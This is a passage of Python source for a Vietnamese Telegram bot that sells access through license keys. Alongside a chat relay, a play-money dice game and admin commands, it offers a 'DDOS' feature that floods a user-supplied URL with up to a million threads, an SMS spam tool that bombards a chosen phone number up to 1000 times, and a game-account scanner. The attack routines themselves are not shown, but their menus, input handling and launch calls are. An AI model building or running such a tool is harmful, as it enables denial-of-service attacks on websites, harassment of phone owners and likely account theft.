        if key in chat_state["messages"]:
            for item in chat_state["messages"][key]:
                try: await context.bot.delete_message(item["chat_id"], item["message_id"]); deleted += 1
                except: pass
            del chat_state["messages"][key]
        await update.message.reply_text(f"✅ Đã xóa {deleted} tin của {chat_display_name(target_id)}.")
        return

    if context.user_data.get("expect_chat_ib"):
        context.user_data.pop("expect_chat_ib")
        parts = txt.split(maxsplit=1)
        if len(parts) < 2: await update.message.reply_text("❌ Thiếu nội dung."); return
        target, msg = parts; target_id = None
        if target.startswith("@"):
            uname = target[1:].lower()
            for k, v in user_data_store.items():
                if k in ("blacklist","owner","bot_enabled","keys","top_reset_date","shop_items"): continue
                if v.get("profile",{}).get("username","").lower() == uname: target_id = int(k); break
        else:
            try: target_id = int(target)
            except: pass
        if not target_id: await update.message.reply_text("❌ Không tìm thấy."); return
        try:
            await context.bot.send_message(target_id, f"📩 *{chat_display_name(uid)} nhắn riêng:*\n{msg}", parse_mode="Markdown")
            await update.message.reply_text(f"✅ Đã gửi đến {chat_display_name(target_id)}.")
        except Exception as e:
            await update.message.reply_text(f"❌ Lỗi: {e}")
        return

    # Relay
    name = chat_display_name(uid)
    await chat_relay(context, uid, f"💬 {name}: {txt}")
    try: await update.message.delete()
    except: pass

# ==================== TOP (CHỈ RESET VND, GIỮ IZE) ====================
async def cmd_top(update, context):
    uid = update.effective_user.id
    if not check_antispam(uid)[0]: return
    if not is_owner(uid) and not check_user_key(uid): await request_key(update, context); return
    today = date.today().isoformat()
    last_reset = user_data_store.get("top_reset_date","2000-01-01")
    try:
        last = date.fromisoformat(last_reset)
        if (date.today() - last).days >= 7:
            users = []
            for uid_str, data in user_data_store.items():
                if uid_str in ("owner","blacklist","bot_enabled","top_reset_date","shop_items"): continue
                try:
                    u = int(uid_str); bal = data.get("game",{}).get("balance",0)
                    users.append((u, bal))
                except: pass
            users.sort(key=lambda x: x[1], reverse=True)
            top_old = users[:3]
            rewards = {1: 2_000_000_000, 2: 1_000_000_000, 3: 500_000_000}
            for i, (u, bal) in enumerate(top_old, start=1):
                game = get_user_game_data(u); game["balance"] += rewards.get(i,0)
            for uid_str, data in user_data_store.items():
                if uid_str in ("owner","blacklist","bot_enabled","top_reset_date","shop_items"): continue
                game = data.get("game")
                if game: game["balance"] = 0
            user_data_store["top_reset_date"] = today
            await update.message.reply_text("🔄 Đã reset bảng xếp hạng VND và trao thưởng top 3! IZE không bị reset.")
            save_global_config(); save_all_data()
    except: pass
    users = []
    for uid_str, data in user_data_store.items():
        if uid_str in ("owner","blacklist","bot_enabled","top_reset_date","shop_items"): continue
        try:
            u = int(uid_str); bal = data.get("game",{}).get("balance",0)
            ize_bal = data.get("game",{}).get("ize_balance",0)
            users.append((u, bal, ize_bal))
        except: pass
    users.sort(key=lambda x: x[1], reverse=True)
    top20 = users[:20]
    text_lines = ["🏆 *Top 20 giàu nhất (VND):*\n"]
    for i, (u, bal, ize) in enumerate(top20, start=1):
        profile = user_data_store.get(str(u),{}).get("profile",{})
        uname = profile.get("username", str(u))
        text_lines.append(f"{i}. `{uname}` - {format_money(bal)} | {format_ize(ize)}")
    if not top20: text_lines.append("Chưa có ai.")
    await update.message.reply_text("\n".join(text_lines), parse_mode="Markdown")

# ==================== CALLBACK HANDLER ====================
async def button_callback(update, context):
    query = update.callback_query; await query.answer()
    uid = update.effective_user.id; update_user_profile(uid, update)
    if query.data.startswith("shop_"):
        if query.data in ("shop_confirm","shop_cancel"): await shop_confirm_callback(update, context)
        else: await shop_callback(update, context)
        return
    if query.data.startswith("chat_"):
        await chat_callback(update, context); return
    if query.data == "game_currency":
        await game_currency_toggle(update, context); return
    if not is_owner(uid) and not check_user_key(uid):
        await query.edit_message_text("🔑 Bạn cần key để dùng bot. Hãy /start để nhập key."); return
    if chat_state["active"] and uid in chat_state["users"]:
        await query.answer("Bạn đang trong chat, dùng nút hoặc /leave."); return
    ok, antispam_msg = check_antispam(uid)
    if not ok: await query.edit_message_text(antispam_msg); return
    if not is_bot_enabled() and not is_owner(uid): await query.edit_message_text("⚠️ Bot đang tạm dừng."); return
    data = query.data; rt = get_user_runtime(uid)

    if data == "main_menu": await query.edit_message_text("🏠 Menu", reply_markup=main_menu_keyboard())
    elif data == "menu_proxy": await query.edit_message_text("🌐 Proxy", reply_markup=proxy_menu_keyboard())
    elif data == "menu_xworld": await query.edit_message_text("🎯 XWorld", reply_markup=xworld_menu_keyboard())
    elif data == "game_menu": mk,tx = game_menu_keyboard(uid); await query.edit_message_text(tx, parse_mode='Markdown', reply_markup=mk)
    elif data == "menu_ddos": await query.edit_message_text("💣 DDOS", reply_markup=ddos_menu_keyboard())
    elif data == "menu_scanlq": await query.edit_message_text("🎮 Scan LQ", reply_markup=scan_lq_menu_keyboard())
    elif data == "menu_spam": await query.edit_message_text("📧 Spam SMS", reply_markup=spam_menu_keyboard())

    elif data == "ddos_start": await ddos_input_url(update, context)
    elif data == "ddos_stop":
        if uid in stress_tasks: stress_tasks[uid].set(); await query.edit_message_text("🛑 Đã dừng test.")
        else: await query.edit_message_text("ℹ️ Không có test.")

    elif data == "scanlq_quantity":
        context.user_data["expect_scanlq"] = "quantity"; await query.edit_message_text("Nhập số lượng (1-10):")
    elif data == "scanlq_infinite":
        if uid in scan_lq_tasks: await query.edit_message_text("⚠️ Đang scan, hãy dừng trước.")
        else:
            asyncio.create_task(scan_lq_infinite(update.effective_chat.id, context))
            await query.edit_message_text("♾️ Đã bắt đầu scan liên tục!")
    elif data == "scanlq_stop":
        if uid in scan_lq_tasks: scan_lq_tasks[uid].set(); await query.edit_message_text("🛑 Đã dừng.")
        else: await query.edit_message_text("ℹ️ Không có scan.")

    elif data == "spam_input":
        context.user_data["expect_spam"] = "phone"; await query.edit_message_text("Nhập SĐT (10 số, bắt đầu 0):")
    elif data == "spam_stop":
        if uid in spam_tasks: spam_tasks[uid].set(); await query.edit_message_text("🛑 Đã dừng spam.")
        else: await query.edit_message_text("ℹ️ Không có spam.")

    elif data.startswith("proxy_"):
        act = data[6:]
        if act == "stop_scan": await proxy_stop_scan(update, uid); await query.edit_message_text("🛑 Đã dừng quét.")
        elif act in ("check_auto","check_long","start_scan"):
            if rt.get("proxy_task") and not rt["proxy_task"].done():
                await query.edit_message_text("⚠️ Scan proxy đang chạy."); return
            if act == "check_auto": await run_proxy_check(update, context, False)
            elif act == "check_long": await run_proxy_check(update, context, True)
            elif act == "start_scan": await run_proxy_check(update, context, False)
            await query.edit_message_text("⏳ Đã bắt đầu...")
        elif act == "check_file":
            context.user_data["waiting_proxy_file"] = True; await query.edit_message_text("📎 Gửi file .txt.")

    elif data == "game_setbet": await game_setbet_prompt(update, context)
    elif data == "game_input_bet": await game_input_bet(update, context)
    elif data == "game_allin": await game_allin(update, context)
    elif data == "game_tai": await play_tai_xiu(update, context, "tai")
    elif data == "game_xiu": await play_tai_xiu(update, context, "xiu")

# ==================== TEXT HANDLER ====================
async def handle_text(update, context):
    uid = update.effective_user.id; update_user_profile(uid, update); txt = update.message.text.strip()
    if txt.startswith("/shop"):
        await cmd_shop(update, context); return
    if context.user_data.get("shop_state"):
        await handle_shop_input(update, context); return
    if context.user_data.get("expect_key"):
        await process_key_input(update, context); return
    if not is_owner(uid) and not check_user_key(uid):
        await request_key(update, context); return
    ok, antispam_msg = check_antispam(uid)
    if not ok: await update.message.reply_text(antispam_msg); return
    if not is_bot_enabled() and not is_owner(uid): await update.message.reply_text("⚠️ Bot đang tạm dừng."); return
    if is_blacklisted(uid): await update.message.reply_text("⛔ Bạn đã bị ban vĩnh viễn."); return
    if chat_state["active"] and uid in chat_state["users"]:
        await handle_chat_text(update, context); return

    if "expect_ddos" in context.user_data:
        state = context.user_data["expect_ddos"]
        if state == 'url':
            if not is_valid_url(txt): await update.message.reply_text("❌ URL không hợp lệ."); return
            context.user_data.pop("expect_ddos"); await ddos_input_threads(update, context, txt)
        elif state == 'threads':
            try: th = int(txt); assert 1 <= th <= 1000000
            except: await update.message.reply_text("❌ 1-1,000,000"); return
            context.user_data.pop("expect_ddos"); await ddos_input_duration(update, context, th)
        elif state == 'duration':
            try: dur = int(txt); assert 1 <= dur <= 60
            except: await update.message.reply_text("❌ 1-60"); return
            url = context.user_data.get("ddos_url"); th = context.user_data.get("ddos_threads")
            context.user_data.pop("expect_ddos",None); context.user_data.pop("ddos_url",None); context.user_data.pop("ddos_threads",None)
            await run_stress_test(update, context, update.effective_chat.id, url, th, dur)
        return

    if "expect_scanlq" in context.user_data:
        try: qty = int(txt); assert 1 <= qty <= 10
        except: await update.message.reply_text("❌ 1-10"); return
        context.user_data.pop("expect_scanlq")
        asyncio.create_task(scan_lq_worker(update.effective_chat.id, qty, context))
        await update.message.reply_text(f"🚀 Bắt đầu scan {qty} tài khoản..."); return

    if "expect_spam" in context.user_data:
        state = context.user_data["expect_spam"]
        if state == "phone":
            if not re.match(r"^0\d{9}$", txt): await update.message.reply_text("❌ SĐT không hợp lệ."); return
            context.user_data["spam_phone"] = txt; context.user_data["expect_spam"] = "count"
            await update.message.reply_text("Nhập số lần (1-1000):")
        elif state == "count":
            try: cnt = int(txt); assert 1 <= cnt <= 1000
            except: await update.message.reply_text("❌ 1-1000"); return
            phone = context.user_data.get("spam_phone")
            context.user_data.pop("expect_spam",None); context.user_data.pop("spam_phone",None)
            asyncio.create_task(spam_worker(update.effective_chat.id, phone, cnt, context))
            await update.message.reply_text(f"🚀 Bắt đầu spam {cnt} lần tới {phone}")
        return

    if "expect_game_bet" in context.user_data: await process_game_bet_amount(update, context); return

    if "expect_xw" in context.user_data:
        expect = context.user_data["expect_xw"]; data = get_user_xworld_data(uid)
        if expect == "account_link":
            u, k = parse_account_link(txt)
            if u and k:
                data["accounts"].append({"user_id":u,"secret_key":k}); data["claimed_history"].setdefault(u,[]); save_all_data()
                await update.message.reply_text(f"✅ Đã thêm `{u}`.", parse_mode='Markdown', reply_markup=xw_settings_keyboard())
            else: await update.message.reply_text("❌ Link lỗi.", reply_markup=xw_settings_keyboard())
            context.user_data.pop("expect_xw")
        elif expect == "threshold":
            try: v = int(txt); assert v > 0; data["threshold"] = v; save_all_data()
            except: await update.message.reply_text("❌ Số nguyên dương."); return
            await update.message.reply_text(f"✅ Ngưỡng mới: {v}", reply_markup=xw_settings_keyboard())
            context.user_data.pop("expect_xw")
        elif expect == "code":
            info = get_code_info(txt, get_proxy_dict(uid))
            if info["status"]:
                if not any(c["code"]==txt for c in data["codes"]):
                    data["codes"].append({"code":txt,"info":info}); save_all_data()
                    await update.message.reply_text(f"✅ Thêm code `{txt}` | Còn: {info['remaining']}/{info['total']}", reply_markup=xworld_menu_keyboard())
                else: await update.message.reply_text("⚠️ Đã có.", reply_markup=xworld_menu_keyboard())
            else: await update.message.reply_text(f"❌ Code lỗi: {info.get('message')}", reply_markup=xworld_menu_keyboard())
            context.user_data.pop("expect_xw")
        return

    await update.message.reply_text("Gõ /menu để xem danh sách lệnh.")

# ==================== ADMIN COMMANDS ====================
async def cmd_broadcast(update, context):
    if not is_admin(update.effective_user.id): await update.message.reply_text("❌"); return
    if not context.args: await update.message.reply_text("/broadcast <msg>"); return
    msg = " ".join(context.args); sent = 0
    for k in user_data_store:
        if k in ("owner","blacklist","bot_enabled","top_reset_date","shop_items"): continue
        try: await context.bot.send_message(int(k), f"📢 {msg}"); sent += 1
        except: pass
    await update.message.reply_text(f"✅ Đã gửi đến {sent} người.")

async def cmd_ban(update, context):
    if not is_admin(update.effective_user.id): return
    if not context.args: return
    try: target = int(context.args[0])
    except: await update.message.reply_text("ID lỗi."); return
    if target == update.effective_user.id: await update.message.reply_text("Không thể tự ban."); return
    bl = user_data_store.setdefault("blacklist",[])
    if str(target) not in bl: bl.append(str(target)); save_global_config(); save_all_data(); await update.message.reply_text(f"✅ Đã ban {target}.")
    else: await update.message.reply_text(f"ℹ️ Đã bị ban.")

async def cmd_unban(update, context):
    if not is_admin(update.effective_user.id): return
    if not context.args: return
    try: target = int(context.args[0])
    except: return
    bl = user_data_store.setdefault("blacklist",[])
    if str(target) in bl: bl.remove(str(target)); save_global_config(); save_all_data(); await update.message.reply_text(f"✅ Đã bỏ ban {target}.")
    else: await update.message.reply_text(f"ℹ️ Không có trong blacklist.")

async def cmd_list_ids(update, context):
    if not is_admin(update.effective_user.id): return
    users = []; banned = []
    for k,v in user_data_store.items():
        if k in ("owner","blacklist","bot_enabled","top_reset_date","shop_items"): continue
        try: users.append(int(k))
        except: pass
    for b in user_data_store.get("blacklist",[]):
        try: banned.append(int(b))
        except: pass
    lines = []
    if users: lines.append(f"📋 Hoạt động ({len(users)}):"); lines.extend(f"• `{u}`" for u in sorted(users))
    if banned: lines.append(f"\n🚫 Bị ban ({len(banned)}):"); lines.extend(f"• `{b}`" for b in sorted(banned))
    if not lines: await update.message.reply_text("Chưa có ai."); return
    if len(users)+len(banned) <= 100: await update.message.reply_text("\n".join(lines), parse_mode="Markdown")
    else:
        with tempfile.NamedTemporaryFile("w", delete=False, suffix=".txt", encoding="utf-8") as f:
            f.write("Danh sách ID\n"); f.write(f"-- Hoạt động ({len(users)}) --\n"); f.writelines(f"{u}\n" for u in sorted(users))
            if banned: f.write(f"\n-- Bị ban ({len(banned)}) --\n"); f.writelines(f"{b}\n" for b in sorted(banned))
            f_path = f.name
        await update.message.reply_document(open(f_path,"rb"), filename="ids.txt"); os.unlink(f_path)

async def cmd_whois(update, context):
    if not is_admin(update.effective_user.id): return
    if not context.args: return
    try: target = int(context.args[0])
    except: return
    p = user_data_store.get(str(target),{}).get("profile",{})
    if not p: await update.message.reply_text("❌ Không có dữ liệu."); return
    uname = f"@{p['username']}" if p.get("username") else "Không"
    full = f"{p.get('first_name','')} {p.get('last_name','')}".strip() or "Không"
    await update.message.reply_text(f"👤 *{target}*\n• Tên: {full}\n• Username: {uname}", parse_mode="Markdown")

async def cmd_channel(update, context):
    if not is_admin(update.effective_user.id): return
    if not context.args: return
    uname = context.args[0]
    if not uname.startswith("@"): uname = "@"+uname
    try:
        chat = await context.bot.get_chat(uname)
        members = "Không rõ"
        try: members = str(await chat.get_member_count())
        except: pass
        info = f"📺 {uname}\n• Tên: {chat.title}\n• Loại: {chat.type}"
        if chat.description: info += f"\n• Mô tả: {chat.description[:200]}"
        info += f"\n• Thành viên: {members}"
        await update.message.reply_text(info)
    except BadRequest as e: await update.message.reply_text(f"❌ {e.message}")

async def cmd_setowner(update, context):
    uid = update.effective_user.id
    owner = user_data_store.get("owner",0)
    if owner == 0 or owner == uid: user_data_store["owner"] = uid; save_global_config(); save_all_data(); await update.message.reply_text(f"✅ Bạn là chủ bot.")
    else: await update.message.reply_text("❌ Chủ bot đã được thiết lập.")

# ==================== KEY ADMIN COMMANDS ====================
async def cmd_genkey(update, context):
    if not is_admin(update.effective_user.id): return
    duration = context.args[0] if context.args else None
    key = create_key(update.effective_user.id, duration)
    expiry = "vĩnh viễn"
    if duration:
        match = re.match(r"(\d+)\s*(s|m|h|d|w|month|year)", duration.lower())
        if match: expiry = f"sau {match.group(1)} {match.group(2)}"
    await update.message.reply_text(f"🔑 Key: `{key}`\n⏱️ Hết hạn: {expiry}", parse_mode="Markdown")

async def cmd_genmasterkey(update, context):
    if not is_owner(update.effective_user.id): return
    duration = context.args[0] if context.args else None
    key = create_key(update.effective_user.id, duration, is_master=True)
    expiry = "vĩnh viễn"
    if duration:
        match = re.match(r"(\d+)\s*(s|m|h|d|w|month|year)", duration.lower())
        if match: expiry = f"sau {match.group(1)} {match.group(2)}"
    await update.message.reply_text(f"👑 Key Master: `{key}`\n⏱️ Hết hạn: {expiry}", parse_mode="Markdown")

async def cmd_listkeys(update, context):
    if not is_admin(update.effective_user.id): return
    keys = user_data_store.get("keys", {})
    if not keys: await update.message.reply_text("Chưa có key nào."); return
    lines = ["Danh sách key:"]
    for k, v in keys.items():
        expires = v.get("expires_at","vĩnh viễn")
        assigned = v.get("assigned_to","chưa dùng")
        lines.append(f"`{k}` -> {assigned} (hết hạn: {expires})")
    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")

async def cmd_keyinfo(update, context):
    if not is_admin(update.effective_user.id): return
    if not context.args: return
    key = context.args[0]
    info = user_data_store.get("keys",{}).get(key)
    if not info: await update.message.reply_text("Key không tồn tại."); return
    await update.message.reply_text(f"Key: {key}\nTạo bởi: {info['created_by']}\nNgày tạo: {info['created_at']}\nHết hạn: {info.get('expires_at','vĩnh viễn')}\nNgười dùng: {info.get('assigned_to','chưa')}")

async def cmd_revokekey(update, context):
    if not is_admin(update.effective_user.id): return
    if not context.args: return
    key = context.args[0]
    keys = user_data_store.get("keys",{})
    if key not in keys: await update.message.reply_text("Key không tồn tại."); return
    assigned = keys[key].get("assigned_to")
    if assigned:
        user_data_store[str(assigned)]["activated_key"] = None
        if keys[key].get("is_master"): user_data_store[str(assigned)].pop("is_master", None)
    del keys[key]; save_all_data(); save_global_config()
    await update.message.reply_text("✅ Đã thu hồi key.")

# ==================== STOPBOT / STARTBOT ====================
async def cmd_stopbot(update, context):
    if not is_admin(update.effective_user.id): await update.message.reply_text("❌"); return
    user_data_store["bot_enabled"] = False; save_global_config(); save_all_data()
    await stop_all_tasks()
    for k in user_data_store:
        if k in ("owner","blacklist","bot_enabled","top_reset_date","shop_items"): continue
        try: await context.bot.send_message(int(k), "⚠️ Bot đã tắt.")
        except: pass
    await update.message.reply_text("✅ Bot đã dừng. Dùng /startbot để bật lại.")

async def cmd_startbot(update, context):
    if not is_admin(update.effective_user.id): await update.message.reply_text("❌"); return
    user_data_store["bot_enabled"] = True; save_global_config(); save_all_data()
    for k in user_data_store:
        if k in ("owner","blacklist","bot_enabled","top_reset_date","shop_items"): continue
        try: await context.bot.send_message(int(k), "✅ Bot đã bật lại.")
        except: pass
    await update.message.reply_text("✅ Bot đã bật lại.")

async def stop_all_tasks():
    for uid, rt in user_runtime.items():
        if rt.get("proxy_task") and not rt["proxy_task"].done():
            rt["proxy_stop_event"].set(); rt["proxy_task"].cancel()
        if rt.get("monitoring"):
            rt["monitoring"] = False
            if rt.get("monitor_task"): rt["monitor_task"].cancel()
        rt["proxy_task"] = None; rt["proxy_msg"] = None; rt["proxy_stop_event"] = None; rt["monitor_task"] = None
    for ev in scan_lq_tasks.values(): ev.set()
    scan_lq_tasks.clear()
    for ev in spam_tasks.values(): ev.set()
    spam_tasks.clear()
    for ev in stress_tasks.values(): ev.set()
    stress_tasks.clear()

# ==================== USER PROXY COMMANDS ====================
async def cmd_setproxy(update, context):
    uid = update.effective_user.id
    if not check_antispam(uid)[0]: return
    if not is_owner(uid) and not check_user_key(uid): await request_key(update, context); return
    if not context.args: set_user_proxy(uid, None); await update.message.reply_text("✅ Đã xóa proxy.")
    else: proxy_str = context.args[0]; set_user_proxy(uid, proxy_str); await update.message.reply_text(f"✅ Đã lưu proxy: {proxy_str}")

async def cmd_myproxy(update, context):
    uid = update.effective_user.id
    if not check_antispam(uid)[0]: return
    if not is_owner(uid) and not check_user_key(uid): await request_key(update, context); return
    proxy = get_user_proxy_string(uid)
    await update.message.reply_text(f"Proxy của bạn: {proxy}" if proxy else "Bạn chưa cài proxy. Dùng /setproxy <proxy>")

# ==================== START (HIỆN KEY + THƯỞNG) ====================
async def start(update, context):
    uid = update.effective_user.id; update_user_profile(uid, update)
    if is_owner(uid):
        await update.message.reply_text("👑 Chào chủ bot! Gõ /menu.")
        return
    if not check_user_key(uid):
        await request_key(update, context)
        return
    welcome = grant_welcome_bonus(uid)
    daily = grant_daily_bonus(uid)
    g = get_user_game_data(uid)
    msg = f"🎉 Chào mừng bạn đến với Bot!\n🆔 ID: `{uid}`\n💰 VND: {format_money(g['balance'])}\n💠 IZE: {format_ize(g['ize_balance'])}"
    if welcome: msg += "\n🎁 +10,000,000 VND thưởng lần đầu!"
    if daily: msg += "\n📅 +500,000 VND thưởng hàng ngày!"
    msg += "\n🔑 Key hiện tại: hợp lệ\n🛒 /shop - Cửa hàng\n📋 /menu - Danh sách lệnh\n💬 /chat - Chat Relay"
    await update.message.reply_text(msg, parse_mode='Markdown')

async def menu_command(update, context):
    uid = update.effective_user.id; update_user_profile(uid, update)
    if not is_owner(uid) and not check_user_key(uid): await request_key(update, context); return
    if not is_bot_enabled() and not is_owner(uid): await update.message.reply_text("⚠️ Bot đang tạm dừng."); return
    if not check_antispam(uid)[0]: return
    commands_text = (
        "📋 *Danh sách lệnh:*\n"
        "/start - Bắt đầu\n/shop - Cửa hàng\n/menu - Xem menu\n"
        "/chat - Chat Relay\n/setproxy <proxy> - Cài proxy\n/myproxy - Xem proxy\n"
        "/proxy - Scan Proxy\n/xworld - Canh Code\n/game - Tài Xỉu (VND/IZE)\n"
        "/ddos - DDOS Test\n/scanlq - Scan Acc LQ\n/spam - Spam SMS\n"
        "/top - Bảng xếp hạng\n/bank <id> <số> - Chuyển VND\n/bank ize <id> <số> - Chuyển IZE\n"
        "/convert <số> - Đổi VND→IZE\n/convertize <số> - Đổi IZE→VND\n/ize - Xem IZE\n"
        "/nap <số> - Nạp IZE qua MB Bank\n/mynapcode - Xem mã nạp\n"
        "Admin: /vnd, /vnd ize, /broadcast, /ban, /unban, /id, /whois, /channel, /stopbot, /startbot, /genkey, /listkeys, /keyinfo, /revokekey\n"
        "Chủ bot: /giftize, /rmbank, /rmvnd, /genmasterkey, /setowner"
    )
    await update.message.reply_text(commands_text, parse_mode="Markdown")

# ==================== LỆNH TẮT ====================
async def cmd_proxy(update, context):
    if not is_owner(update.effective_user.id) and not check_user_key(update.effective_user.id): await request_key(update, context); return
    await update.message.reply_text("🌐 Scan Proxy", reply_markup=proxy_menu_keyboard())
async def cmd_xworld(update, context):
    if not is_owner(update.effective_user.id) and not check_user_key(update.effective_user.id): await request_key(update, context); return
    await update.message.reply_text("🎯 Canh Code", reply_markup=xworld_menu_keyboard())
async def cmd_game(update, context):
    uid = update.effective_user.id
    if not is_owner(uid) and not check_user_key(uid): await request_key(update, context); return
    mk, tx = game_menu_keyboard(uid)
    await update.message.reply_text(tx, parse_mode='Markdown', reply_markup=mk)
async def cmd_ddos(update, context):
    if not is_owner(update.effective_user.id) and not check_user_key(update.effective_user.id): await request_key(update, context); return
    await update.message.reply_text("💣 DDOS Test", reply_markup=ddos_menu_keyboard())
async def cmd_scanlq(update, context):
    if not is_owner(update.effective_user.id) and not check_user_key(update.effective_user.id): await request_key(update, context); return
    await update.message.reply_text("🎮 Scan Acc LQ", reply_markup=scan_lq_menu_keyboard())
async def cmd_spam(update, context):
    if not is_owner(update.effective_user.id) and not check_user_key(update.effective_user.id): await request_key(update, context); return
    await update.message.reply_text("📧 Spam SMS", reply_markup=spam_menu_keyboard())

# ==================== MAIN ====================
def main():
    init_supabase()
    load_all_data()
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("menu", menu_command))
    app.add_handler(CommandHandler("shop", cmd_shop))
    app.add_handler(CommandHandler("chat", cmd_chat))
    app.add_handler(CommandHandler("proxy", cmd_proxy))
    app.add_handler(CommandHandler("xworld", cmd_xworld))
    app.add_handler(CommandHandler("game", cmd_game))
    app.add_handler(CommandHandler("ddos", cmd_ddos))
    app.add_handler(CommandHandler("scanlq", cmd_scanlq))
    app.add_handler(CommandHandler("spam", cmd_spam))
    app.add_handler(CommandHandler("top", cmd_top))
    app.add_handler(CommandHandler("bank", cmd_bank))
    app.add_handler(CommandHandler("vnd", cmd_vnd))
    app.add_handler(CommandHandler("convert", cmd_convert))
    app.add_handler(CommandHandler("convertize", cmd_convertize))
    app.add_handler(CommandHandler("ize", cmd_ize))
    app.add_handler(CommandHandler("giftize", cmd_giftize))
    app.add_handler(CommandHandler("rmbank", cmd_rmbank))
    app.add_handler(CommandHandler("rmvnd", cmd_rmvnd))
    app.add_handler(CommandHandler("broadcast", cmd_broadcast))
    app.add_handler(CommandHandler("ban", cmd_ban))
    app.add_handler(CommandHandler("unban", cmd_unban))
    app.add_handler(CommandHandler("id", cmd_list_ids))
    app.add_handler(CommandHandler("whois", cmd_whois))
    app.add_handler(CommandHandler("channel", cmd_channel))
    app.add_handler(CommandHandler("setowner", cmd_setowner))
    app.add_handler(CommandHandler("stopbot", cmd_stopbot))
    app.add_handler(CommandHandler("startbot", cmd_startbot))
    app.add_handler(CommandHandler("genkey", cmd_genkey))
    app.add_handler(CommandHandler("genmasterkey", cmd_genmasterkey))
    app.add_handler(CommandHandler("listkeys", cmd_listkeys))
    app.add_handler(CommandHandler("keyinfo", cmd_keyinfo))
    app.add_handler(CommandHandler("revokekey", cmd_revokekey))
    app.add_handler(CommandHandler("setproxy", cmd_setproxy))
    app.add_handler(CommandHandler("myproxy", cmd_myproxy))
    # ========== NẠP IZE ==========
    app.add_handler(CommandHandler("nap", cmd_nap))
    app.add_handler(CommandHandler("mynapcode", cmd_mynapcode))
    if SEPA_API_TOKEN:
        app.job_queue.run_repeating(check_nap_transactions, interval=30, first=10)
    # ============================
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_proxy_file_upload))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    logger.info("Bot đa năng đang chạy...")
    app.run_polling()

if __name__ == "__main__":
    main()
